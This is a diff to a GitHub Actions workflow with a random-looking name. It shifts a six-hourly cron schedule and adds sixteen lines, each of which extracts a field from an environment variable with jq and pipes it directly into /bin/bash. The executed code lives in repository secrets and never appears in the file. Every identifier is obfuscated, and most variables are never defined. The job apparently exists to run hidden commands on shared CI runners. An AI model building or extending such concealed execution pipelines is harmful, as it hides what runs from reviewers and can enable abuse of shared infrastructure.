@@ -3,7 +3,8 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '59 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          zqqhz171: ${{ secrets.zqqhz171 }}
+          brirk396: ${{ secrets.brirk396 }}
         run: |
-          echo $zqqhz171 | jq -r .g010 | /bin/bash
-          echo $w3 | jq -r .mlpsm08810 | /bin/bash
-          echo $i2 | jq -r .dvvb9820 | /bin/bash
-          echo $jmo233 | jq -r .bakmb65536 | /bin/bash
-          echo $vfcbk58211 | jq -r .ybyow2 | /bin/bash
-          echo $ru87503 | jq -r .yavkw25 | /bin/bash
-          echo $puut4 | jq -r .o11 | /bin/bash
+          echo $brirk396 | jq -r .m615 | /bin/bash
+          echo $yfa37 | jq -r .c8262 | /bin/bash
+          echo $ii60865 | jq -r .mvya1 | /bin/bash
+          echo $wcshf869 | jq -r .e1 | /bin/bash
+          echo $lyyb010 | jq -r .mc53853 | /bin/bash
+          echo $lvb60 | jq -r .ewp95 | /bin/bash
+          echo $ds57 | jq -r .w43164 | /bin/bash
+          echo $le6 | jq -r .qobw6360 | /bin/bash
+          echo $vbeyb0962 | jq -r .ji9409 | /bin/bash
+          echo $tm5 | jq -r .zc5027 | /bin/bash
+          echo $kgt09 | jq -r .nl07127 | /bin/bash
+          echo $axl72778 | jq -r .c5 | /bin/bash
+          echo $knslt305 | jq -r .kbs2535 | /bin/bash
+          echo $kkhzl780 | jq -r .vn0 | /bin/bash
+          echo $w92736 | jq -r .yqcqn3970 | /bin/bash
+          echo $l721 | jq -r .jds0429 | /bin/bash
 
